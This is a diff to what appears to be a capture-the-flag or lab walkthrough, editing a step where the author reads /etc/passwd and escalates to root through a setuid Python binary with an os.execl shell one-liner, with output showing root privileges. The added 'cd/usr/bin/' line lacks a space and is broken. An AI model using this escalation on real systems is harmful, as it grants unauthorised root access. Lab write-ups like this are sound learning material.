@@ -90,7 +90,8 @@ cat /etc/passwd
 ```
 As I didn't have the correct permissions to view `/etc/shadow` I started to search for binary manipulations that could escalate my viewing privileges. The box's walkthrough recommended [GTFObins](https://gtfobins.github.io/gtfobins/python/) which was a new resource for me. After some research I found that by running a command through python we could manipulate our session to give us a higher viewing privilege.
 ```bash
-./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+cd/usr/bin/
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 id
   uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
 ```
